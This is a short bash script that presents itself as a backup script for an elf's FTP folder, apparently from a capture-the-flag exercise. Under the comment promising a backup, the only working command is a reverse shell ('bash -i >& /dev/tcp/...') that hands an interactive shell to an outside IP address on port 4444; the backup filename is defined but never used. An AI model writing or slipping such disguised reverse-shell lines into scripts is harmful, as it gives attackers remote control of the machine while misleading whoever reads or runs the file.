#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
bash -i >& /dev/tcp/10.17.6.109/4444 0>&1


# TO-DO: Automate transfer of backups to backup server


